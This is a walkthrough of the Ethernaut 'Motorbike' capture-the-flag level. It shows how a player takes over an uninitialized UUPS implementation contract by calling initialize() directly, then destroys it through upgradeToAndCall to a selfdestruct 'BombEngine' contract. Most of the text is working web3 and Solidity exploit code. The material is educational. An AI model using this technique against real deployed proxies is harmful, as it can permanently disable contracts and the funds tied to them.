`player` has to make the proxy (`Motorbike`) unusable by destroying the implementation/logic contract (`Engine`) through `selfdestruct`.

As you can see current `Engine` implementation has no `selfdestruct` logic anywhere. So, we can't call `selfdestruct` with current implementation anyway. But, since it is a logic/implementation contract of proxy pattern, it can be upgraded to a new contract that has the `selfdestruct` in it.

`upgradeToAndCall` method is at our disposal for upgrading to a new contract address, but it has an authorization check such that only the `upgrader` address can call it. So, `player` has to somehow take over as `upgrader`.

The key thing to keep in mind here is that any storage variables defined in the logic contract i.e. `Engine` is actually stored in the proxy's (`Motorbike`'s) storage and not actually `Engine`. Proxy is the storage layer here which delegates _only_ the logic to logic/implementation contract (logic layer). 

What if we did try to write and read in the context of `Engine` directly, instead of going through proxy? We'll need address of `Engine` first. This address is at storage slot `_IMPLEMENTATION_SLOT` of `Motorbike`. Let's read it:

```javascript
implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

// Output: '0x000000000000000000000000<20-byte-implementation-contract-address>'
```
This yields a 32 byte value (each slot is 32 byte). Remove padding of `0`s to get 20 byte `address`:
```javascript
implAddr = '0x' + implAddr.slice(-40)

// Output: '0x<20-byte-implementation-contract-address>'
```

Now, if we sent a transaction directly to `initialize` of `Engine` rather than going through proxy, the code will run in `Engine`'s context rather than proxy's. That means the storage variables - `initialized`, `initializing` (inherited from `Initializable`), `upgrader` etc. will be read from `Engine`'s storage slots. And these variables will most likely will contain their default values - `false`, `false`, `0x0` respectively because `Engine` was supposed to be only the logic layer, not storage.
And since `initialized` will be equal to `false` (default for `bool`) in context of `Engine` the `initializer` modifier on `initialize` method will pass!

Call the `initialize` at `Engine`'s address i.e. at `implAddr`:
```javascript
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
```

Alright, invoking `initialize` method must've now set `player` as `upgrader`. Verify by:
```javascript
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")

await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

// Output: true
```

So, `player` is now eligible to upgrade the implementation contract now through `upgradeToAndCall` method. Let's create the following malicious contract - `BombEngine` in Remix:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract BombEngine {
    function explode() public {
        selfdestruct(address(0));
    }
}
```
Deploy `BombEngine` (on same network) and copy it's address.

If we set the new implementation through `upgradeToAndCall`, passing `BombEngine` address and encoding of it's `explode` method as params, the existing `Engine` would destroy itself. This is because `_upgradeToAndCall` delegates a call to the given new implementation address with provided `data` param. And since `delegatecall` is context preserving, the `selfdestruct` of `explode` method would run in context of `Engine`. Thus `Engine` is destroyed.

Upgrade `Engine` to `BombEngine`. First set up function data of `upgradeToAndCall` to call at `implAddress`:
```javascript
bombAddr = '<BombEngine-instance-address>'
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData]

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
```

Now call `upgradeToAndCall` at `implAddr`:
```javascript
await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
```

Boom! The `Engine` is destroyed! The `Motorbike` is now useless. `Motorbike` cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.
